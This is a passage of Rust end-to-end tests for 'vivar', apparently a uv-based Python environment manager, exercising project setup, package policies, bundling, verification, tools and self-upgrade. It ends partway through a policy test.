//! End-to-end tests against the real `uv` binary. They need `uv` on PATH and
//! network access the first time a Python version or package is fetched.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

/// `Scripts` on Windows, `bin` elsewhere.
const BIN: &str = if cfg!(windows) { "Scripts" } else { "bin" };

struct TempDir(PathBuf);

impl TempDir {
    fn new(name: &str) -> Self {
        let dir = std::env::temp_dir().join(format!("vivar-it-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        TempDir(dir)
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn vivar(dir: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(dir)
        .args(args)
        .output()
        .expect("failed to spawn vivar")
}

fn ok(dir: &Path, args: &[&str]) -> Output {
    let out = vivar(dir, args);
    assert!(
        out.status.success(),
        "vivar {} failed:\n{}{}",
        args.join(" "),
        stdout_of(&out),
        String::from_utf8_lossy(&out.stderr)
    );
    out
}

fn fails_with(dir: &Path, args: &[&str], needle: &str) {
    let out = vivar(dir, args);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !out.status.success(),
        "vivar {} unexpectedly succeeded",
        args.join(" ")
    );
    assert!(
        stderr.contains(needle),
        "stderr did not contain {needle:?}:\n{stderr}"
    );
}

fn stdout_of(out: &Output) -> String {
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn read(path: &Path) -> String {
    fs::read_to_string(path).unwrap()
}

fn init(dir: &Path) {
    ok(dir, &["init", "demo", "--python", "3.12"]);
}

fn exe(name: &str) -> String {
    format!("{name}{}", std::env::consts::EXE_SUFFIX)
}

fn site_packages(dir: &Path) -> PathBuf {
    if cfg!(windows) {
        return dir.join(".venv").join("Lib").join("site-packages");
    }
    fs::read_dir(dir.join(".venv").join("lib"))
        .unwrap()
        .map(|e| e.unwrap().path())
        .find(|p| {
            p.file_name()
                .unwrap()
                .to_string_lossy()
                .starts_with("python")
        })
        .unwrap()
        .join("site-packages")
}

/// A PATH with no `uv` on it.
fn bare_path() -> &'static str {
    if cfg!(windows) {
        r"C:\Windows\System32"
    } else {
        "/usr/bin:/bin"
    }
}

#[test]
fn init_add_run_remove_roundtrip() {
    let tmp = TempDir::new("roundtrip");
    let dir = &tmp.0;
    init(dir);

    for file in ["pyproject.toml", ".python-version", "uv.lock"] {
        assert!(dir.join(file).is_file(), "{file} missing after init");
    }
    assert!(dir.join(".venv").is_dir(), ".venv missing after init");
    for junk in ["main.py", "README.md", ".git", "src"] {
        assert!(!dir.join(junk).exists(), "init should not create {junk}");
    }
    let pyproject = read(&dir.join("pyproject.toml"));
    assert!(
        pyproject.contains("[tool.vivar.policy]\ndeny = []"),
        "{pyproject}"
    );

    ok(dir, &["add", "six"]);
    assert!(read(&dir.join("pyproject.toml")).contains("\"six"));
    ok(dir, &["run", "python", "-c", "import six"]);

    ok(dir, &["add", "--group", "dev", "iniconfig"]);
    let pyproject = read(&dir.join("pyproject.toml"));
    assert!(pyproject.contains("[dependency-groups]"), "{pyproject}");
    assert!(pyproject.contains("iniconfig"));

    ok(dir, &["lock"]);
    ok(dir, &["sync"]);

    ok(dir, &["remove", "six"]);
    assert!(!read(&dir.join("pyproject.toml")).contains("\"six"));
    fails_with(dir, &["run", "python", "-c", "import six"], "six");
}

#[test]
fn run_propagates_exit_code_and_relative_paths() {
    let tmp = TempDir::new("exitcode");
    let dir = &tmp.0;
    init(dir);

    let out = vivar(dir, &["run", "python", "-c", "raise SystemExit(7)"]);
    assert_eq!(out.status.code(), Some(7));

    let sub = dir.join("scripts");
    fs::create_dir_all(&sub).unwrap();
    fs::write(sub.join("hello.py"), "print('hello from vivar')\n").unwrap();
    let out = ok(&sub, &["run", "python", "hello.py"]);
    assert!(stdout_of(&out).contains("hello from vivar"));
}

#[test]
fn init_no_sync_skips_environment() {
    let tmp = TempDir::new("nosync");
    let dir = &tmp.0;
    ok(dir, &["init", "demo", "--python", "3.12", "--no-sync"]);
    assert!(dir.join("pyproject.toml").is_file());
    assert!(!dir.join(".venv").exists());
    assert!(!dir.join("uv.lock").exists());

    // Templates lay out the shapes teams start from.
    let svc = tmp.0.join("svc");
    fs::create_dir_all(&svc).unwrap();
    ok(
        &svc,
        &[
            "init",
            "my-svc",
            "--python",
            "3.12",
            "--no-sync",
            "--template",
            "service",
        ],
    );
    let text = read(&svc.join("pyproject.toml"));
    assert!(
        text.contains("build-backend") && text.contains("serve = \"python -m my_svc\""),
        "{text}"
    );
    assert!(svc.join("src").join("my_svc").join("__main__.py").is_file());
    let nb = tmp.0.join("nb");
    fs::create_dir_all(&nb).unwrap();
    ok(
        &nb,
        &[
            "init",
            "lab",
            "--python",
            "3.12",
            "--no-sync",
            "--template",
            "notebook",
        ],
    );
    let text = read(&nb.join("pyproject.toml"));
    assert!(
        text.contains("ipykernel") && text.contains("lab = \"jupyter lab notebooks\""),
        "{text}"
    );
    assert!(nb.join("notebooks").is_dir());
}

#[test]
fn deny_list_is_enforced_everywhere() {
    let tmp = TempDir::new("deny");
    let dir = &tmp.0;
    init(dir);

    let path = dir.join("pyproject.toml");
    let pyproject = read(&path).replace("deny = []", "deny = [\"requests\"]");
    fs::write(&path, &pyproject).unwrap();

    fails_with(dir, &["add", "Requests>=2"], "deny list");
    fails_with(dir, &["add", "--group", "dev", "requests"], "deny list");

    // Policy is found from a subdirectory too.
    let sub = dir.join("src").join("pkg");
    fs::create_dir_all(&sub).unwrap();
    fails_with(&sub, &["add", "requests"], "deny list");

    // Hand-editing the dependency list can't bypass policy.
    let edited = pyproject.replace("dependencies = []", "dependencies = [\"requests\"]");
    assert_ne!(
        edited, pyproject,
        "fixture didn't match the generated pyproject"
    );
    fs::write(&path, edited).unwrap();
    fails_with(dir, &["lock"], "deny list");
    fails_with(dir, &["sync"], "deny list");
    fails_with(dir, &["run", "python", "-c", "pass"], "deny list");
}

#[test]
fn project_commands_outside_a_project_explain_themselves() {
    let tmp = TempDir::new("noproject");
    let dir = &tmp.0;
    fails_with(dir, &["add", "six"], "run `vivar init`");
    fails_with(dir, &["sync"], "run `vivar init`");
    fails_with(dir, &["lock"], "run `vivar init`");
    fails_with(dir, &["run", "python", "-c", "pass"], "run `vivar init`");
}

#[test]
fn init_and_run_work_without_uv() {
    let tmp = TempDir::new("nouv");
    let dir = &tmp.0;
    let no_uv = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("PATH", bare_path())
            .args(args)
            .output()
            .unwrap()
    };

    let out = no_uv(&["init", "demo", "--python", "3.12"]);
    assert!(
        out.status.success(),
        "init without uv failed:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(stdout_of(&out).contains("uv.lock will be written"));
    assert!(dir.join("pyproject.toml").is_file());
    assert_eq!(read(&dir.join(".python-version")).trim(), "3.12");
    let cfg = read(&dir.join(".venv").join("pyvenv.cfg"));
    assert!(cfg.contains("created-by = vivar"), "{cfg}");
    assert!(!dir.join("uv.lock").exists());

    // The env is a real one: its interpreter is the pinned managed build and
    // sees the venv as its prefix.
    let out = no_uv(&[
        "run",
        "python",
        "-c",
        "import sys; print(sys.version_info[:2] == (3, 12), sys.prefix)",
    ]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let stdout = stdout_of(&out);
    assert!(stdout.starts_with("True "), "{stdout}");
    assert!(
        stdout.contains(".venv"),
        "sys.prefix is not the venv: {stdout}"
    );

    // Exit codes come straight through; a missing program is an error, not a panic.
    assert_eq!(
        no_uv(&["run", "python", "-c", "raise SystemExit(3)"])
            .status
            .code(),
        Some(3)
    );
    let out = no_uv(&["run", "definitely-not-a-program"]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("definitely-not-a-program"));

    // Activation in the platform's plain shell sets VIRTUAL_ENV and finds python.
    let venv = dir.join(".venv");
    #[cfg(unix)]
    let out = Command::new("sh")
        .arg("-c")
        .arg(format!(
            ". '{}/bin/activate' && printf '%s\\n' \"$VIRTUAL_ENV\" && python -c 'import sys; print(sys.prefix)' && deactivate && [ -z \"$VIRTUAL_ENV\" ]",
            venv.display()
        ))
        .output()
        .unwrap();
    #[cfg(windows)]
    let out = {
        let script = dir.join("activate-check.cmd");
        fs::write(
            &script,
            format!(
                "@echo off\r\ncall \"{v}\\Scripts\\activate.bat\"\r\necho %VIRTUAL_ENV%\r\npython -c \"import sys; print(sys.prefix)\"\r\ncall deactivate.bat\r\nif defined VIRTUAL_ENV exit /b 9\r\n",
                v = venv.display()
            ),
        )
        .unwrap();
        Command::new("cmd")
            .args(["/C", script.to_str().unwrap()])
            .env("PATH", bare_path())
            .output()
            .unwrap()
    };
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    // Compared canonically: macOS reports the cwd under /private/var.
    let stdout = stdout_of(&out);
    let venv = fs::canonicalize(&venv).unwrap();
    for line in stdout.lines().take(2) {
        assert_eq!(fs::canonicalize(line.trim()).unwrap(), venv, "{stdout}");
    }

    // uv can take over the same env later.
    ok(dir, &["add", "six"]);
    assert!(dir.join("uv.lock").is_file());
    ok(dir, &["run", "python", "-c", "import six"]);
}

#[test]
fn python_list_shows_managed_builds() {
    let tmp = TempDir::new("pylist");
    let out = ok(&tmp.0, &["python", "list"]);
    let stdout = stdout_of(&out);
    assert!(stdout.contains("cpython-3.12."), "{stdout}");
    assert!(stdout.contains("cpython-3.12.") && !stdout.contains("download available"));
}

#[test]
fn index_url_is_passed_to_uv() {
    let tmp = TempDir::new("index");
    let dir = &tmp.0;
    ok(dir, &["init", "demo", "--python", "3.12", "--no-sync"]);

    let path = dir.join("pyproject.toml");
    let pyproject = read(&path).replace(
        "deny = []",
        "deny = []\nindex-url = \"http://127.0.0.1:9/simple\"",
    );
    fs::write(&path, pyproject).unwrap();

    // The mirror is unreachable, so resolution must fail against it rather than PyPI.
    let out = vivar(dir, &["add", "six"]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(!out.status.success());
    assert!(
        stderr.contains("127.0.0.1:9"),
        "uv did not use the mirror:\n{stderr}"
    );
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn pack_and_unpack_produce_a_self_contained_env() {
    let tmp = TempDir::new("bundle");
    let src = tmp.0.join("src-machine");
    fs::create_dir_all(&src).unwrap();
    init(&src);
    // pycodestyle ships a console script, so its launcher must survive the move.
    ok(&src, &["add", "six", "pycodestyle"]);

    let archive = tmp.0.join("demo.tar.gz");
    ok(&src, &["pack", "--output", archive.to_str().unwrap()]);
    assert!(archive.is_file());

    let listing = Command::new("tar")
        .args(["-tzf", archive.to_str().unwrap()])
        .output()
        .unwrap();
    let listing = String::from_utf8_lossy(&listing.stdout);
    assert!(listing.contains("vivar-bundle.toml"), "{listing}");
    assert!(
        listing.contains(&format!(".venv/{BIN}/activate")),
        "{listing}"
    );
    assert!(
        !listing.contains("__pycache__"),
        "pycache should be excluded"
    );
    assert!(
        !listing.contains("/lib/python3.12/test/") && !listing.contains("/Lib/test/"),
        "stdlib tests should be excluded"
    );

    // "Other machine": a different directory, and the source project is gone.
    let dest = tmp.0.join("dest-machine").join("app");
    ok(
        &tmp.0,
        &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
    );
    fs::remove_dir_all(&src).unwrap();

    let bin = dest.join(".venv").join(BIN);
    let out = Command::new(bin.join(exe("python")))
        .args([
            "-c",
            "import six, sys; print(sys.prefix); print(sys.base_prefix)",
        ])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let inside = |line: &str| {
        let canonical = dest.canonicalize().unwrap();
        let p = Path::new(line);
        p.starts_with(&dest) || p.canonicalize().is_ok_and(|p| p.starts_with(&canonical))
    };
    for line in stdout_of(&out).lines() {
        assert!(inside(line), "{line} is outside the unpacked bundle");
    }

    // Console script launcher points at the new venv.
    let out = Command::new(bin.join(exe("pycodestyle")))
        .arg("--version")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );

    // Activation works in the platform's plain shell.
    let venv_s = dest.join(".venv").to_string_lossy().into_owned();
    #[cfg(unix)]
    let out = Command::new("sh")
        .arg("-c")
        .arg(format!(
            ". '{venv_s}/bin/activate' && printf '%s\\n' \"$VIRTUAL_ENV\" && python -c 'import six, sys; print(sys.executable)'"
        ))
        .output()
        .unwrap();
    #[cfg(windows)]
    let out = {
        // Separate lines: cmd expands %VIRTUAL_ENV% when it parses a line, so it
        // must be read on a line after the one that calls activate.bat.
        let script = tmp.0.join("activate-check.cmd");
        fs::write(
            &script,
            format!(
                "@echo off\r\ncall \"{venv_s}\\Scripts\\activate.bat\"\r\necho %VIRTUAL_ENV%\r\npython -c \"import six, sys; print(sys.executable)\"\r\n"
            ),
        )
        .unwrap();
        Command::new("cmd")
            .args(["/C", script.to_str().unwrap()])
            .output()
            .unwrap()
    };
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let stdout = stdout_of(&out);
    let mut lines = stdout.lines().map(str::trim);
    assert_eq!(lines.next().unwrap(), venv_s);
    let executable = lines.next().unwrap();
    assert!(inside(executable), "{executable} is not the bundled python");

    fails_with(
        &tmp.0,
        &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
        "already contains",
    );

    // verify works on the bundle with no uv anywhere on PATH.
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&tmp.0)
        .env("PATH", bare_path())
        .args(["verify", dest.to_str().unwrap()])
        .output()
        .unwrap();
    let stdout = stdout_of(&out);
    assert!(
        out.status.success(),
        "{stdout}{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(stdout.contains("0 errors"), "{stdout}");
}

#[test]
fn verify_reports_broken_packages_and_missing_cuda() {
    let tmp = TempDir::new("verify");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "six", "pycodestyle"]);

    // --min-vram is only judged when torch is there; a plain environment passes.
    ok(dir, &["verify", "--min-vram", "48"]);
    let out = ok(dir, &["verify", "--verbose"]);
    let stdout = stdout_of(&out);
    assert!(stdout.contains("ok   six"), "{stdout}");
    assert!(stdout.contains("0 errors"), "{stdout}");

    let site = site_packages(dir);
    let dist_info = |name: &str, top_level: &str| {
        let info = site.join(format!("{}-1.0.dist-info", name.replace('-', "_")));
        fs::create_dir_all(&info).unwrap();
        fs::write(
            info.join("METADATA"),
            format!("Metadata-Version: 2.1\nName: {name}\nVersion: 1.0\n"),
        )
        .unwrap();
        fs::write(info.join("top_level.txt"), top_level).unwrap();
    };
    // A package whose native dependency is missing on this machine.
    dist_info("gpu-thing", "gpu_thing\n");
    fs::create_dir_all(site.join("gpu_thing")).unwrap();
    fs::write(
        site.join("gpu_thing").join("__init__.py"),
        "import ctypes\nctypes.CDLL('libcudart.so.99')\n",
    )
    .unwrap();
    // An environment that declares CUDA packages.
    dist_info("nvidia-cuda-runtime-cu99", "");
    // A script copied from somewhere else.
    fs::write(
        dir.join(".venv").join(BIN).join("stale"),
        "#!/nonexistent/.venv/bin/python\nprint(1)\n",
    )
    .unwrap();

    let run = |extra: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("VIVAR_CUDA_LIB", "libvivar_no_such_driver.so")
            .arg("verify")
            .args(extra)
            .output()
            .unwrap()
    };

    let out = run(&[]);
    let stdout = stdout_of(&out);
    assert_eq!(out.status.code(), Some(1), "{stdout}");
    assert!(
        stdout.contains("ERR  gpu-thing: import gpu_thing failed:"),
        "{stdout}"
    );
    assert!(stdout.contains("libcudart.so.99"), "{stdout}");
    assert!(
        stdout.contains("ERR  CUDA: environment contains CUDA packages (nvidia-cuda-runtime-cu99) but no NVIDIA driver"),
        "{stdout}"
    );
    assert!(
        stdout.contains("ERR  stale: shebang points at missing /nonexistent/.venv/bin/python"),
        "{stdout}"
    );
    assert!(stdout.contains("3 errors"), "{stdout}");

    let out = run(&["--allow-missing-gpu"]);
    let stdout = stdout_of(&out);
    assert!(stdout.contains("WARN CUDA"), "{stdout}");
    assert!(stdout.contains("2 errors, 1 warnings"), "{stdout}");

    fails_with(&tmp.0, &["verify", "nowhere"], "no environment found");
}

#[test]
fn a_directory_index_url_is_an_offline_wheelhouse() {
    let tmp = TempDir::new("wheelhouse");
    let dir = &tmp.0;
    init(dir);

    // Hand-roll a minimal wheel with the env's own Python; no network involved.
    let wheelhouse = tmp.0.join("wheelhouse");
    fs::create_dir_all(&wheelhouse).unwrap();
    let whl = wheelhouse.join("minipkg-1.0-py3-none-any.whl");
    let script = format!(
        "import zipfile\n\
         with zipfile.ZipFile({:?}, 'w') as z:\n\
         \x20   z.writestr('minipkg/__init__.py', 'VALUE = 42\\n')\n\
         \x20   z.writestr('minipkg-1.0.dist-info/METADATA', 'Metadata-Version: 2.1\\nName: minipkg\\nVersion: 1.0\\n')\n\
         \x20   z.writestr('minipkg-1.0.dist-info/WHEEL', 'Wheel-Version: 1.0\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n')\n\
         \x20   z.writestr('minipkg-1.0.dist-info/RECORD', '')\n",
        whl.to_str().unwrap()
    );
    ok(dir, &["run", "python", "-c", &script]);

    let path = dir.join("pyproject.toml");
    let pyproject = read(&path).replace(
        "deny = []",
        &format!("deny = []\nindex-url = {:?}", wheelhouse.to_str().unwrap()),
    );
    fs::write(&path, pyproject).unwrap();

    // Fresh cache and no network: the wheel can only have come from the directory.
    let offline = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("UV_OFFLINE", "1")
            .env("UV_NO_CACHE", "1")
            .args(args)
            .output()
            .unwrap()
    };
    let out = offline(&["add", "minipkg"]);
    assert!(
        out.status.success(),
        "add from wheelhouse failed:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let out = ok(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import minipkg; print(minipkg.VALUE)",
        ],
    );
    assert_eq!(stdout_of(&out).trim(), "42");

    // Nothing outside the wheelhouse is reachable, not even PyPI.
    let out = offline(&["add", "six"]);
    assert!(
        !out.status.success(),
        "six came from outside the wheelhouse"
    );
}

#[test]
fn upgrade_installs_from_a_local_archive_or_bundle_dir() {
    let tmp = TempDir::new("upgrade");
    let me = PathBuf::from(env!("CARGO_BIN_EXE_vivar"));

    // A copy standing in for the installed vivar, and a release-style archive
    // around another copy of the same binary.
    let installed = tmp.0.join("bin").join(exe("vivar"));
    fs::create_dir_all(installed.parent().unwrap()).unwrap();
    fs::copy(&me, &installed).unwrap();
    let release = tmp.0.join("vivar-some-target");
    fs::create_dir_all(&release).unwrap();
    fs::copy(&me, release.join(exe("vivar"))).unwrap();
    let archive = tmp.0.join("vivar-some-target.tar.gz");
    let status = Command::new("tar")
        .current_dir(&tmp.0)
        .args(["-czf", archive.to_str().unwrap(), "vivar-some-target"])
        .status()
        .unwrap();
    assert!(status.success());

    for from in [archive.to_str().unwrap(), release.to_str().unwrap()] {
        let out = Command::new(&installed)
            .current_dir(&tmp.0)
            .args(["upgrade", "--from", from])
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "upgrade --from {from} failed:\n{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            stdout_of(&out).contains(" -> vivar "),
            "{}",
            stdout_of(&out)
        );
        let out = Command::new(&installed).arg("--version").output().unwrap();
        assert!(out.status.success(), "replaced binary does not run");
    }
    // The second run must have cleaned up after the first on Windows.
    let out = Command::new(&installed).arg("--version").output().unwrap();
    assert!(out.status.success());
    assert!(!installed.with_extension("new").exists());

    let out = Command::new(&installed)
        .args(["upgrade", "--from", tmp.0.join("nope").to_str().unwrap()])
        .output()
        .unwrap();
    assert!(!out.status.success());
}

/// uv's managed-Python directory for the real user, for tests that move HOME.
fn real_python_dir() -> PathBuf {
    if let Some(d) = std::env::var_os("UV_PYTHON_INSTALL_DIR") {
        return PathBuf::from(d);
    }
    if cfg!(windows) {
        return PathBuf::from(std::env::var_os("APPDATA").unwrap())
            .join("uv")
            .join("python");
    }
    std::env::var_os("XDG_DATA_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            PathBuf::from(std::env::var_os("HOME").unwrap())
                .join(".local")
                .join("share")
        })
        .join("uv")
        .join("python")
}

/// A hand-rolled pure-Python wheel `minipkg` exposing `VALUE = 42`.
fn make_wheel(dir: &Path, into: &Path) -> PathBuf {
    fs::create_dir_all(into).unwrap();
    let whl = into.join("minipkg-1.0-py3-none-any.whl");
    let script = format!(
        "import zipfile\n\
         with zipfile.ZipFile({:?}, 'w') as z:\n\
         \x20   z.writestr('minipkg/__init__.py', 'VALUE = 42\\n')\n\
         \x20   z.writestr('minipkg-1.0.dist-info/METADATA', 'Metadata-Version: 2.1\\nName: minipkg\\nVersion: 1.0\\nLicense-Expression: MIT\\n')\n\
         \x20   z.writestr('minipkg-1.0.dist-info/WHEEL', 'Wheel-Version: 1.0\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n')\n\
         \x20   z.writestr('minipkg-1.0.dist-info/RECORD', '')\n",
        whl.to_str().unwrap()
    );
    ok(dir, &["run", "python", "-c", &script]);
    whl
}

fn append_policy(dir: &Path, extra: &str) {
    let path = dir.join("pyproject.toml");
    let text = read(&path).replace("deny = []", &format!("deny = []\n{extra}"));
    fs::write(&path, text).unwrap();
}

#[test]
fn tasks_and_inline_scripts_run_in_the_right_env() {
    let tmp = TempDir::new("tasks");
    let dir = &tmp.0;
    init(dir);
    let path = dir.join("pyproject.toml");
    let text = read(&path)
        + "\n[tool.vivar.scripts]\nwhere = \"python -c 'import sys; print(\\\"at\\\", sys.prefix)'\"\ncalc = \"python -c\"\n";
    fs::write(&path, text).unwrap();

    // A task named like a script file is still a task when no such file exists.
    let text = read(&path) + "\"oops.py\" = \"python -c 'print(7)'\"\n";
    fs::write(&path, text).unwrap();
    assert_eq!(stdout_of(&ok(dir, &["run", "oops.py"])).trim(), "7");

    let out = ok(dir, &["run", "where"]);
    let stdout = stdout_of(&out);
    assert!(
        stdout.starts_with("at ") && stdout.contains(".venv"),
        "{stdout}"
    );
    // Extra arguments append to the task's command line.
    let out = ok(dir, &["run", "calc", "print(1 + 1)"]);
    assert_eq!(stdout_of(&out).trim(), "2");

    // A PEP 723 script gets its own cached environment, outside the project.
    let script = dir.join("tool.py");
    fs::write(
        &script,
        "# /// script\n# requires-python = \">=3.10,<3.13\"\n# dependencies = [\"six\"]\n# ///\nimport six, sys\nprint(six.__version__, sys.argv[1:], '.venv' in sys.prefix, sys.version_info[:2] == (3, 12))\n",
    )
    .unwrap();
    let cache = dir.join("cache");
    let run = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("VIVAR_CACHE_DIR", &cache)
            .env("UV_CACHE_DIR", dir.join("uv-cache"))
            .args(args)
            .output()
            .unwrap()
    };
    let out = run(&["run", "tool.py", "--flag"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let stdout = stdout_of(&out);
    assert!(stdout.contains("['--flag'] False True"), "{stdout}");
    assert!(cache.join("scripts").is_dir());

    let out = run(&["env", "list"]);
    assert!(stdout_of(&out).contains("scripts"), "{}", stdout_of(&out));
    let out = run(&["clean"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!cache.join("scripts").exists());
}

#[test]
fn tools_get_their_own_env_and_linked_commands() {
    let tmp = TempDir::new("tools");
    let home = tmp.0.join("home");
    fs::create_dir_all(&home).unwrap();
    let run = |args: &[&str]| {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_vivar"));
        cmd.current_dir(&tmp.0)
            .env("HOME", &home)
            .env("USERPROFILE", &home)
            .env("APPDATA", &home)
            .env("XDG_DATA_HOME", home.join("data"))
            .env("UV_CACHE_DIR", home.join("uv-cache"))
            .env("UV_PYTHON_INSTALL_DIR", real_python_dir())
            .args(args);
        cmd.output().unwrap()
    };
    let out = run(&["tool", "run", "pycodestyle", "--version"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        stdout_of(&out).trim().starts_with('2'),
        "{}",
        stdout_of(&out)
    );

    // A command vivar didn't install is never overwritten.
    let link = home.join(".local").join("bin").join(exe("pycodestyle"));
    fs::create_dir_all(link.parent().unwrap()).unwrap();
    fs::write(&link, "someone else's").unwrap();
    let out = run(&["tool", "install", "pycodestyle"]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("not installed by vivar"));
    assert_eq!(read(&link), "someone else's");
    fs::remove_file(&link).unwrap();

    // A link into a tool env from before ownership was recorded is still ours.
    #[cfg(unix)]
    {
        let env_bin = home
            .join("data")
            .join("vivar")
            .join("tools")
            .join("pycodestyle")
            .join("bin")
            .join("pycodestyle");
        std::os::unix::fs::symlink(&env_bin, &link).unwrap();
        let out = run(&["tool", "install", "pycodestyle"]);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    let out = run(&["tool", "install", "pycodestyle"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(link.exists(), "no linked command at {}", link.display());
    let out = Command::new(&link).arg("--version").output().unwrap();
    assert!(out.status.success());

    let out = run(&["tool", "list"]);
    assert!(
        stdout_of(&out).contains("pycodestyle"),
        "{}",
        stdout_of(&out)
    );
    // Pinning a different version rebuilds the env instead of reusing it.
    let out = run(&[
        "tool",
        "run",
        "--from",
        "pycodestyle==2.14.0",
        "pycodestyle",
        "--version",
    ]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(stdout_of(&out).trim(), "2.14.0");

    let out = run(&["tool", "uninstall", "pycodestyle"]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!link.exists());
    assert!(!run(&["tool", "uninstall", "pycodestyle"]).status.success());
}

#[test]
fn tree_why_outdated_upgrade_and_build() {
    let tmp = TempDir::new("tree");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "pytest"]);

    let tree = stdout_of(&ok(dir, &["tree"]));
    assert!(
        tree.contains("pytest v") && tree.contains("pluggy v"),
        "{tree}"
    );
    assert!(tree.starts_with("demo v0.1.0"), "{tree}");
    let tree_json = stdout_of(&ok(dir, &["tree", "--json"]));
    assert!(
        tree_json.starts_with("[{\"name\":\"demo\"") && tree_json.contains("\"dependencies\":["),
        "{tree_json}"
    );
    let why_json = stdout_of(&ok(dir, &["why", "pluggy", "--json"]));
    assert!(
        why_json.starts_with("[[{\"name\":\"demo\"") && why_json.contains("{\"name\":\"pluggy\""),
        "{why_json}"
    );
    let why = stdout_of(&ok(dir, &["why", "pluggy"]));
    assert!(
        why.contains("demo v0.1.0 -> pytest v") && why.ends_with("pluggy v1.6.0\n")
            || why.contains("-> pluggy v"),
        "{why}"
    );
    fails_with(dir, &["why", "nope"], "not in the lockfile");

    let outdated_json = stdout_of(&ok(dir, &["outdated", "--json"]));
    assert!(
        outdated_json.trim_end().starts_with('[') && outdated_json.trim_end().ends_with(']'),
        "{outdated_json}"
    );
    let out = ok(dir, &["outdated"]);
    let text = format!(
        "{}{}",
        stdout_of(&out),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("No lockfile changes") || text.contains("Would"),
        "{text}"
    );
    ok(dir, &["upgrade-deps", "pytest"]);
    ok(dir, &["upgrade-deps"]);

    // Building needs a backend; hatchling is the smallest.
    let path = dir.join("pyproject.toml");
    let text = read(&path)
        + "\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n";
    fs::write(&path, text).unwrap();
    fs::create_dir_all(dir.join("src").join("demo")).unwrap();
    fs::write(dir.join("src").join("demo").join("__init__.py"), "").unwrap();
    ok(dir, &["build"]);
    let wheels: Vec<_> = fs::read_dir(dir.join("dist"))
        .unwrap()
        .flatten()
        .filter(|e| e.path().extension().is_some_and(|x| x == "whl"))
        .collect();
    assert_eq!(wheels.len(), 1);
}

#[test]
fn license_policy_blocks_and_rolls_back() {
    let tmp = TempDir::new("licenses");
    let dir = &tmp.0;
    init(dir);
    append_policy(dir, "allow-licenses = [\"MIT\"]");

    ok(dir, &["add", "six"]);
    // colorama is BSD: refused, and the add is undone.
    fails_with(dir, &["add", "colorama"], "licenses outside");
    assert!(!read(&dir.join("pyproject.toml")).contains("colorama"));
    let listing = stdout_of(&ok(dir, &["licenses"]));
    assert!(
        listing.contains("six") && listing.contains("MIT"),
        "{listing}"
    );
    assert!(!listing.contains("colorama"), "{listing}");

    append_policy(dir, "license-exceptions = [\"colorama\"]");
    ok(dir, &["add", "colorama"]);
    assert!(stdout_of(&ok(dir, &["licenses"])).contains("BSD"));
}

#[test]
fn org_policy_and_require_hashes() {
    let tmp = TempDir::new("orgpolicy");
    let dir = &tmp.0;
    init(dir);
    let org = tmp.0.join("org-policy.toml");
    fs::write(&org, "[policy]\ndeny = [\"six\"]\nrequire-hashes = true\n").unwrap();
    let run = |args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("VIVAR_POLICY", &org)
            .args(args)
            .output()
            .unwrap()
    };

    let out = run(&["add", "six"]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("deny list"));
    let out = run(&["add", "pycodestyle"]);
    assert!(
        out.status.success(),
